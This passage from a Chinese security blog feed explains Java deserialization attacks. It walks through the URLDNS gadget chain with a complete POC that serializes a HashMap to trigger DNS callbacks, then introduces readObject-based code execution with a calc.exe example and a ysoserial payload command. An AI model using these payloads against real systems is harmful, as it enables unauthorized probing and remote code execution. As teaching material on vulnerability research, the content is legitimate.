<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (u.<span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    String host <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getHost</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (host <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> host.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;&#34;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            u.<span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">=</span> InetAddress.<span style="color:#a6e22e">getByName</span>(host);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (UnknownHostException ex) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (SecurityException se) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。</p>
<p>可以理解为,在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求.</p>
<p>这里存在一个问题,当我们生成payload的时候,也会存在计算哈希的过程,我们需要避免这个操作,</p>
<p>回到第一步：HashMap#readObject</p>
<p>key是使用readObject取出来的，也就是说在writeObject一定会写入key</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">writeObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> buckets <span style="color:#f92672">=</span> capacity();
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Write out the threshold, loadfactor, and any hidden stuff</span>
</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">defaultWriteObject</span>();
</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">writeInt</span>(buckets);
</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">writeInt</span>(size);
</span></span><span style="display:flex;"><span>        internalWriteEntries(s);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>跟入internalWriteEntries</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">internalWriteEntries</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s) <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> tab;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&gt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> (tab <span style="color:#f92672">=</span> table) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> tab.<span style="color:#a6e22e">length</span>; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;</span> e <span style="color:#f92672">=</span> tab<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>; e <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>; e <span style="color:#f92672">=</span> e.<span style="color:#a6e22e">next</span>) {
</span></span><span style="display:flex;"><span>                    s.<span style="color:#a6e22e">writeObject</span>(e.<span style="color:#a6e22e">key</span>);
</span></span><span style="display:flex;"><span>                    s.<span style="color:#a6e22e">writeObject</span>(e.<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。</p>
<p>此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span>(K key, V value) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>即</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://xrgsnqezso.yutu.eu.org&#34;</span>);
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(url,123); <span style="color:#75715e">//此时会产生dns查询</span>
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>只想判断payload在对方机器上是否成功触发，那就应该避免掉这一次dns查询以及多余的操作，回到URL#hashCode：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> hashCode;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      hashCode <span style="color:#f92672">=</span> handler.<span style="color:#a6e22e">hashCode</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> hashCode;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>这里会先判断hashCode是否为-1，如果不为-1则直接返回hashCode，也就是说我们只要在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询。(hashCode默认值为-1)
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_1.png" alt=""  />
这里的hashCode是private修饰的，所以我们需要通过反射来修改其值</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://xrgsnqezso.yutu.eu.org&#34;</span>);
</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.net.URL&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>); <span style="color:#75715e">//修改访问权限</span>
</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">set</span>(url,123); <span style="color:#75715e">//设置hashCode值为123，这里可以是任何不为-1的数字</span>
</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(url.<span style="color:#a6e22e">hashCode</span>()); <span style="color:#75715e">// 获取hashCode的值，验证是否修改成功</span>
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(url,123); <span style="color:#75715e">//调用map.put 此时将不会再触发dns查询</span>
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>此时输出url的hashCode为123，证明修改成功。
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_2.png" alt=""  />
当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>URLDNS.<span style="color:#a6e22e">java</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>URL, String<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>URL, String<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://xxxx.xxx.xxx&#34;</span>);
</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.net.URL&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">set</span>(url, 0xdeadbeef); <span style="color:#75715e">// 设一个值, 这样 put 的时候就不会去查询 DNS</span>
</span></span><span style="display:flex;"><span>        hashMap.<span style="color:#a6e22e">put</span>(url, <span style="color:#e6db74">&#34;rmb122&#34;</span>);
</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">set</span>(url, <span style="color:#f92672">-</span>1); <span style="color:#75715e">// hashCode 这个属性不是 transient 的, 所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span>
</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;out.bin&#34;</span>));
</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(hashMap);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>Test.<span style="color:#a6e22e">java</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileInputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;out.bin&#34;</span>));
</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>回过头来看看yso的payload</p>
<p>yso在创建URL对象时使用了三个参数的构造方法。yso用了子类继承父类的方式规避了dns查询的风险，其创建了一个内部类：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span>(URL u) <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>定义了一个URLConnection和getHostAddress方法，当调用put方法走到getHostAddress方法后，会调用SilentURLStreamHandler的getHostAddress而非URLStreamHandler的getHostAddress，这里直接return null了，所以自然也就不会产生dns查询。</p>
<h2 id="参考">参考</h2>
<p><a href="https://d0gekong.github.io/2022/07/13/Java/UrlDNS/" target="_blank" rel="noopener nofollow noreferrer" >urldns | Hack the world</a></p>
<p><a href="https://xz.aliyun.com/t/13060" target="_blank" rel="noopener nofollow noreferrer" >xz.aliyun.com/t/13060</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/javasec" term="sec/javasec" label="sec/javasec" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[javasec-反序列化]]></title>
            <link href="https://l1uyun.one/posts/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
            
            
            <published>2024-08-01T22:16:09+08:00</published>
            <updated>2024-11-24T18:56:35+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="反序列化">反序列化</h1>
<p>序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，
java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，</p>
<p>JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。</p>
<h2 id="前置知识">前置知识</h2>
<h3 id="为什么要序列化">为什么要序列化?</h3>
<p>对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时候就需要序列化技术。</p>
<p>Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。</p>
<p>反序列化条件：</p>
<ul>
<li>该类必须实现 java.io.Serializable 对象</li>
<li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的序列化过程：</li>
</ul>
<ol>
<li>序列化：将 OutputStream 封装在 ObjectOutputStream 内，然后调用 writeObject 即可</li>
<li>反序列化：将 InputStream 封装在 ObjectInputStream 内，然后调用 readObject 即可反序列化出错可能原因</li>
<li>序列化字节码中的 serialVersionUID(用于记录java序列化版本)在进行反序列化时，JVM 会把传来的字节流中的 serialVersionUID 与本地相应实体类的 serialVersionUID 进行比较，如果相同就认为是一致的，可以进行反序列化，否则就抛出序列化版本不一致的异常- InvalidCastException</li>
</ol>
<h3 id="objectoutputstream">ObjectOutputStream</h3>
<p>java.io.ObjectOutputStream 类，将Java对象的原始数据类型写出到文件,实现对象的持久存储。</p>
<p>一个对象要想序列化，必须满足两个条件:
1.该类必须实现 java.io.Serializable 接口， Serializable 是一个标记接口，不实现此接口的类将不会
使任何状态序列化或反序列化，会抛出 NotSerializableException 。
2.该类的所有属性必须是可序列化的。如果有一个属性不需要可序列化的，则该属性必须注明是瞬态的，使用transient 关键字修饰。</p>
<p>示例:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Employee</span> <span style="color:#66d9ef">implements</span> java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Serializable</span>{
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> String name;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> String address;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">transient</span> <span style="color:#66d9ef">int</span> age; <span style="color:#75715e">// transient瞬态修饰成员,不会被序列化</span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addressCheck</span>() {
</span></span><span style="display:flex;"><span>   System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Address check : &#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; -- &#34;</span> <span style="color:#f92672">+</span> address);
</span></span><span style="display:flex;"><span> <span style="color:#75715e">//此处省略tostring等方法</span>
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SerializeDemo</span> {
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>   Employee e <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Employee();
</span></span><span style="display:flex;"><span>   e.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;zhangsan&#34;</span>;
</span></span><span style="display:flex;"><span>   e.<span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> 20;
</span></span><span style="display:flex;"><span>   e.<span style="color:#a6e22e">address</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;shenzhen&#34;</span>;
</span></span><span style="display:flex;"><span>     <span style="color:#75715e">// 创建序列化流</span>
</span></span><span style="display:flex;"><span>     ObjectOutputStream outputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span>
</span></span><span style="display:flex;"><span>FileOutputStream(<span style="color:#e6db74">&#34;ser.txt&#34;</span>));
</span></span><span style="display:flex;"><span>     <span style="color:#75715e">// 写出对象</span>
</span></span><span style="display:flex;"><span>     outputStream.<span style="color:#a6e22e">writeObject</span>(e);
</span></span><span style="display:flex;"><span>     <span style="color:#75715e">// 释放资源</span>
</span></span><span style="display:flex;"><span>     outputStream.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="objectinputstream">ObjectInputStream</h3>
<p>如果能找到一个对象的class文件，我们可以进行反序列化操作，调用 ObjectInputStream 读取对象的方法</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ObjectInputStream.readObject<span style="color:#f92672">()</span>：任何类如果想要序列化必须实现java.io.Serializable接口
</span></span></code></pre></div><h3 id="原生序列化类函数">原生序列化类函数</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-SnakeYaml：完整的YAML1.1规范Processor，支持Java对象的序列化/反序列化
</span></span><span style="display:flex;"><span>-XMLDecoder：xml语言格式序列化类函数接口
</span></span><span style="display:flex;"><span>-ObjectInputStream.readObject<span style="color:#f92672">()</span>：任何类如果想要序列化必须实现java.io.Serializable接口
</span></span></code></pre></div><h2 id="涉及工具">涉及工具</h2>
<p>靶机平台还是这两个</p>
<ul>
<li><a href="https://github.com/j3ers3/Hello-Java-Sec" target="_blank" rel="noopener nofollow noreferrer" >Hello-Java-Sec</a></li>
<li><a href="https://github.com/bewhale/JavaSec" target="_blank" rel="noopener nofollow noreferrer" >JavaSec</a></li>
</ul>
<p>利用工具,后面两个工具集成了第一个</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://github.com/frohoff/ysoserial
</span></span><span style="display:flex;"><span>Yakit https://yaklang.com/
</span></span><span style="display:flex;"><span>https://github.com/NotSoSecure/SerializedPayloadGenerator
</span></span></code></pre></div><h2 id="漏洞基本原理">漏洞基本原理</h2>
<p>在Java反序列化中，会调用被反序列化对象的readObject方法，当readObject方法被<strong>重写不当</strong>时产生漏洞</p>
<p>此处重写了readObject方法，执行Runtime.getRuntime().exec(),
defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行方法</p>
<p>运行流程：
1.People对象序列化进object文件
2.object文件反序列化对象-&gt;调用自身的readObject方法-&gt;执行Runtime.getRuntime().exec(&ldquo;calc.exe&rdquo;);</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">People</span>(String name, String sex, <span style="color:#66d9ef">int</span> age) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sex</span> <span style="color:#f92672">=</span> sex;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> age;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>接着重写readObject方法.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream objInputStream) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 先调用默认的反序列化方法，即readObject</span>
</span></span><span style="display:flex;"><span>        objInputStream.<span style="color:#a6e22e">defaultReadObject</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 再执行自己的代码逻辑，例如执行系统命令</span>
</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc.exe&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>然后去进行序列化</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String <span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>	People people <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> People(<span style="color:#e6db74">&#34;ZhangSan&#34;</span>, <span style="color:#e6db74">&#34;boy&#34;</span>, 18);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 先序列化People对象</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> byteStream <span style="color:#f92672">=</span> SerializeDemo.<span style="color:#a6e22e">Serialize</span>(people);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 再反序列化</span>
</span></span><span style="display:flex;"><span>	SerializeDemo.<span style="color:#a6e22e">DeSerialize</span>(byteStream);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>共同条件：继承 Serializable</p>
<ul>
<li>入口类 source （即找到,重写readObject方法，调用常见的函数，参数类型宽泛 最好 jdk 自带）</li>
<li>调用链 gadget chain （基于类的默认方式调用）</li>
<li>执行类 sink （RCE、SSRF、写文件等操作）</li>
</ul>
<h2 id="漏洞分析">漏洞分析</h2>
<h3 id="漏洞代码">漏洞代码</h3>
<p>靶机平台上的</p>
<h4 id="objectinputstream-1">ObjectInputStream</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// readObject，读取输入流,并转换对象。ObjectInputStream.readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象。</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 生成payload：java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 &#34;open -a Calculator&#34; | base64</span>
</span></span><span style="display:flex;"><span>
